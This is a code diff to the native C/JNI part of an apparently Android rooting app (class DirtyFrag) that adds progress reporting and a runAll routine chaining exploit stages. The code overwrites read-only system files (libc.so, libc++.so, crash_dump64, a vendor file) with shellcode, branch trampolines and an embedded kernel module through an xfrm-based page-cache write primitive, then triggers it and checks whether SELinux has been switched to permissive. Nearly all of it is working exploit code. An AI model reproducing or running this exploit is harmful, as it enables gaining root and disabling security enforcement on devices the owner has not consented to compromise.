@@ -36,6 +36,43 @@
 #define SOL_UDP 17
 #endif
 
+jmethodID report_mid;
+
+JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
+    JNIEnv *env;
+    (*vm)->GetEnv(vm, (void**) &env, JNI_VERSION_1_4);
+    jclass clz = (*env)->FindClass(env, "org/lsposed/lspromise/DirtyFrag");
+    report_mid = (*env)->GetMethodID(env, clz, "report", "(Ljava/lang/String;)V");
+    return JNI_VERSION_1_4;
+}
+
+struct Reporter {
+    JNIEnv *env;
+    jobject obj;
+};
+
+static void report(struct Reporter *reporter, const char* msg) {
+    if (!reporter) return;
+    JNIEnv *env = reporter->env;
+    jstring s = (*env)->NewStringUTF(env, msg);
+    (*env)->CallVoidMethod(env, reporter->obj, report_mid, s);
+    (*env)->ExceptionClear(env);
+    (*env)->DeleteLocalRef(env, s);
+}
+
+#define REPORT(...) (reportfmt(reporter, __VA_ARGS__))
+#define REPORTLN(fmt, ...) (reportfmt(reporter, fmt "\n" __VA_OPT__(,) __VA_ARGS__))
+
+static void reportfmt(struct Reporter *reporter, const char *fmt, ...) __attribute__((__format__(printf, 2, 3)));
+static void reportfmt(struct Reporter *reporter, const char *fmt, ...) {
+    if (!reporter) return;
+    va_list va;
+    va_start(va, fmt);
+    char buf[1024];
+    vsnprintf(buf, sizeof(buf), fmt, va);
+    report(reporter, buf);
+}
+
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
 
 #define ENC_PORT         4500
@@ -375,7 +412,7 @@ out_close_1:
     return ret;
 }
 
-static int patch_file(const char *path, char *addr, size_t len, size_t foff, int beginspi, int use_helper) {
+static int patch_file(const char *path, char *addr, size_t len, size_t foff, int beginspi, int use_helper, struct Reporter *reporter) {
     int file_fd;
     if (use_helper) {
         file_fd = -1;
@@ -405,6 +442,7 @@ static int patch_file(const char *path, char *addr, size_t len, size_t foff, int
     }
     LOGI("installed %zu xfrm SAs", len / 4);
     LOGD("patch at offset %zu", foff);
+    REPORTLN("patch at offset %zu", foff);
 
     for (int i = 0; i < len / 4; i++) {
         uint32_t spi = beginspi + i;
@@ -417,9 +455,11 @@ static int patch_file(const char *path, char *addr, size_t len, size_t foff, int
         //LOGD("do_one_write #%d at off=0x%lx", i, (long) off);
         if (i % 100 == 0) {
             LOGD("wrote %d", i * 4);
+            REPORT("wrote %d ...", i*4);
         }
     }
     LOGI("wrote %d bytes to %s starting at 0x%x", len, path, foff);
+    REPORTLN("\nwrote %d bytes to %s starting at 0x%x", len, path, foff);
     // not close, hold it
     // LOGD("leaked fd %d", file_fd);
     close(file_fd);
@@ -438,17 +478,19 @@ extern char stage2_first_inst_copy[];
 
 int find_hook_target(const char *libcxx, const char* symname, uint64_t *hook_target, uint64_t *payload_target, uint32_t* first_instruction);
 
-int patch_libc() {
+int patch_libc(struct Reporter *reporter) {
     uint64_t hook_offset, shellcode_offset;
     uint32_t first_insn;
     int ret;
     ret = find_hook_target("/system/lib64/libc.so",  "__libc_init", &hook_offset, &shellcode_offset, &first_insn);
     if (ret) {
         LOGE("find_hook_target");
+        REPORTLN("find libc hook target failed");
         return ret;
     }
 
     LOGD("hook libc offset: %llx shellcode off %llx payload len %d", hook_offset, shellcode_offset, stage2_len);
+    REPORTLN("hook libc offset: %llx shellcode off %llx payload len %d", hook_offset, shellcode_offset, stage2_len);
 
     // Aarch64 branch
     const uint32_t BRANCH = 0x14000000;
@@ -458,9 +500,11 @@ int patch_libc() {
     uint32_t start_offset = (char*)stage2_start - (char*)stage2_data;
     size_t offs = shellcode_offset + start_offset - hook_offset;
     LOGI("jump off %lx", offs);
+    REPORTLN("jump off %lx", offs);
     hook_data |= ((offs) >> 2) & ((1 << 26) - 1);
     int hook_data_size = 4;
     LOGI("hook insn: %x", hook_data);
+    REPORTLN("hook insn: %x", hook_data);
 
     // Jump back to hook target + 4.
     uint32_t jmpback = BRANCH;
@@ -469,35 +513,41 @@ int patch_libc() {
 
     *(uint32_t *)&stage2_first_inst_copy[0] = first_insn;
 
-    printf("Shell code size: %d 0x%x bytes\n", stage2_len, stage2_len);
+    REPORTLN("Shell code size: %d 0x%x bytes", stage2_len, stage2_len);
 
     size_t foff = shellcode_offset;
 
-    ret = patch_file("/system/lib64/libc.so", stage2_data, stage2_len, foff, 0xDEADBE10, 0);
+    REPORTLN("patching shellcode");
+    ret = patch_file("/system/lib64/libc.so", stage2_data, stage2_len, foff, 0xDEADBE10, 0, reporter);
     if (ret) {
-        LOGE("patch trampoline");
+        LOGE("patch shellcode err %d", ret);
+        REPORTLN("patch shellcode err: %d", ret);
         return ret;
     }
 
-    ret = patch_file("/system/lib64/libc.so", (char*) &hook_data, sizeof(hook_data), hook_offset, 0xDEADBCCC, 0);
+    REPORTLN("patching trampoline");
+    ret = patch_file("/system/lib64/libc.so", (char*) &hook_data, sizeof(hook_data), hook_offset, 0xDEADBCCC, 0, reporter);
     if (ret) {
-        LOGE("patch hook");
+        REPORTLN("patching trampoline err %d", ret);
+        LOGE("patch trampoline err %d", ret);
         return ret;
     }
     return 0;
 }
 
-int patch_cxx(int run_index) {
+int patch_cxx(int run_index, struct Reporter *reporter) {
     uint64_t hook_offset, shellcode_offset;
     uint32_t first_insn;
     int ret;
     ret = find_hook_target("/system/lib64/libc++.so",  "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_", &hook_offset, &shellcode_offset, &first_insn);
     if (ret) {
-        LOGE("find_hook_target");
+        LOGE("find cxx hook target err: %d", ret);
+        REPORTLN("find cxx hook target err: %d", ret);
         return ret;
     }
 
     LOGD("hook offset: %llx shellcode off %llx payload len %d", hook_offset, shellcode_offset, stage1_len);
+    REPORTLN("hook offset: %llx shellcode off %llx payload len %d", hook_offset, shellcode_offset, stage1_len);
 
     // Aarch64 branch
     const uint32_t BRANCH = 0x14000000;
@@ -507,9 +557,11 @@ int patch_cxx(int run_index) {
     uint32_t start_offset = (char*)stage1_start - (char*)stage1_data;
     size_t offs = shellcode_offset + start_offset - hook_offset;
     LOGI("jump off %lx", offs);
+    REPORTLN("jump off %lx", offs);
     hook_data |= ((offs) >> 2) & ((1 << 26) - 1);
     int hook_data_size = 4;
     LOGI("hook insn: %x", hook_data);
+    REPORTLN("hook insn: %x", hook_data);
 
     //sprintf(stage1_filename, "/dev/.dirtypipe-%04d", run_index);
     //LOGI("Stage1 debug filename: %s", stage1_filename);
@@ -522,19 +574,25 @@ int patch_cxx(int run_index) {
 
     *(uint32_t *)&stage1_first_inst_copy[0] = first_insn;
 
-    printf("Shell code size: %d 0x%x bytes\n", stage1_len, stage1_len);
+    REPORTLN("Shell code size: %d 0x%x bytes\n", stage1_len, stage1_len);
 
     size_t foff = shellcode_offset;
 
-    ret = patch_file("/system/lib64/libc++.so", stage1_data, stage1_len, foff, 0xDEADBE10, 0);
+    LOGI("patching libc++ shellcode");
+    REPORTLN("patching libc++ shellcode");
+    ret = patch_file("/system/lib64/libc++.so", stage1_data, stage1_len, foff, 0xDEADBE10, 0, reporter);
     if (ret) {
-        LOGE("patch trampoline");
+        REPORTLN("patch libc++ shellcode err %d", ret);
+        LOGE("patch libc++ shellcode err %d", ret);
         return ret;
     }
 
-    ret = patch_file("/system/lib64/libc++.so", (char*) &hook_data, sizeof(hook_data), hook_offset, 0xDEADBCCC, 0);
+    LOGI("patching libc++ trampoline");
+    REPORTLN("patching libc++ trampoline");
+    ret = patch_file("/system/lib64/libc++.so", (char*) &hook_data, sizeof(hook_data), hook_offset, 0xDEADBCCC, 0, reporter);
     if (ret) {
-        LOGE("patch hook");
+        REPORTLN("patch libc++ trampoline err %d", ret);
+        LOGE("patch libc++ trampoline err %d", ret);
         return ret;
     }
     return 0;
@@ -563,26 +621,30 @@ extern char dirtyfrag_ko_end[];
 extern char splice_helper_start[];
 extern char splice_helper_end[];
 
-int patch_ko() {
+int patch_ko(struct Reporter *reporter) {
     //char buf[] = {1,2,3,4};
     LOGD("patch1");
     size_t len = splice_helper_end - splice_helper_start;
     // "/vendor/lib/libstagefright_soft_g711dec.so"
     LOGD("patching crashdump");
+    REPORTLN("patching crashdump");
     int ret =
-    patch_file(kCrashDump, splice_helper_start, len, 0, 0xdead0000, 0);
+    patch_file(kCrashDump, splice_helper_start, len, 0, 0xdead0000, 0, reporter);
 
-    LOGD("patch1 ret %d", ret);
+    LOGD("patch crashdump ret %d", ret);
+    REPORTLN("patch crashdump ret %d", ret);
     if (ret)
         return ret;
 
     len = dirtyfrag_ko_end - dirtyfrag_ko_start;
 
     LOGD("patching vendorfile");
-    ret = patch_file("", dirtyfrag_ko_start , len, 0, 0xdead0000, 1);
+    REPORTLN("patching vendorfile");
+    ret = patch_file("[vendorfile]", dirtyfrag_ko_start , len, 0, 0xdead0000, 1, reporter);
         // patch_file("", buf, sizeof(buf), 0, 0xdead0000, 1);
 
     LOGD("patch2 ret %d", ret);
+    REPORTLN("patch2 ret %d", ret);
 
     return ret;
 }
@@ -603,7 +665,7 @@ Java_org_lsposed_lspromise_DirtyFrag_patchMod(JNIEnv *env, jclass clazz) {
     if (cpid < 0) return 1;
 
     if (cpid == 0) {
-        int rc = patch_ko();
+        int rc = patch_ko(NULL);
         _exit(rc == 0 ? 0 : 2);
     }
     int cstatus;
@@ -623,7 +685,7 @@ Java_org_lsposed_lspromise_DirtyFrag_patchLibc(JNIEnv *env, jclass clazz) {
     pid_t cpid = fork();
     if (cpid < 0) return 1;
     if (cpid == 0) {
-        int rc = patch_libc();
+        int rc = patch_libc(NULL);
         _exit(rc == 0 ? 0 : 2);
     }
     int cstatus;
@@ -643,7 +705,7 @@ Java_org_lsposed_lspromise_DirtyFrag_patchCxx(JNIEnv *env, jclass clazz) {
     pid_t cpid = fork();
     if (cpid < 0) return 1;
     if (cpid == 0) {
-        int rc = patch_cxx(0);
+        int rc = patch_cxx(0, NULL);
         _exit(rc == 0 ? 0 : 2);
     }
     int cstatus;
@@ -657,8 +719,8 @@ Java_org_lsposed_lspromise_DirtyFrag_patchCxx(JNIEnv *env, jclass clazz) {
     return 0;
 }
 
-JNIEXPORT jint JNICALL
-Java_org_lsposed_lspromise_DirtyFrag_createOrphanProcess(JNIEnv *env, jclass clazz) {
+static int createOrphanProcess() {
+
     int pid = fork();
     if (pid < 0) {
         PLOGE("fork");
@@ -677,4 +739,56 @@ Java_org_lsposed_lspromise_DirtyFrag_createOrphanProcess(JNIEnv *env, jclass cla
         TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
     }
     return 0;
+}
+
+JNIEXPORT jint JNICALL
+Java_org_lsposed_lspromise_DirtyFrag_createOrphanProcess(JNIEnv *env, jclass clazz) {
+    return createOrphanProcess();
+}
+
+static int getenforce() {
+    int fd = open("/sys/fs/selinux/enforce", O_RDONLY|O_CLOEXEC);
+    if (fd < 0) {
+        PLOGE("open enforce");
+        return 1;
+    }
+    char buf;
+    if (read(fd, &buf, sizeof(buf)) != sizeof(buf)) {
+        close(fd);
+        return 1;
+    }
+    close(fd);
+    return buf == 1;
+}
+
+static int has_mark() {
+    return access("/dev/df", F_OK) == 0 || errno != ENOENT;
+}
+
+JNIEXPORT void JNICALL
+Java_org_lsposed_lspromise_DirtyFrag_runAll(JNIEnv *env, jobject thiz) {
+    struct Reporter reporterobj = {
+        .env = env,
+        .obj = thiz
+    }, *reporter = &reporterobj;
+    if (patch_ko(reporter)) {
+        return;
+    }
+    if (patch_libc(reporter)) {
+        return;
+    }
+    if (patch_cxx(0, reporter)) {
+        return;
+    }
+    for (int i = 0; i < 3; i++) {
+        usleep(300000);
+        REPORTLN("trying to trigger (%d)..", i);
+        createOrphanProcess();
+        usleep(300000); // 300ms
+        REPORTLN("has_mark: %d", has_mark());
+        int force = getenforce();
+        REPORTLN("selinux enforcing: %d", force);
+        if (force == 0) return;
+    }
+    REPORTLN("selinux permissive is not detected, exploition may failed!");
 }
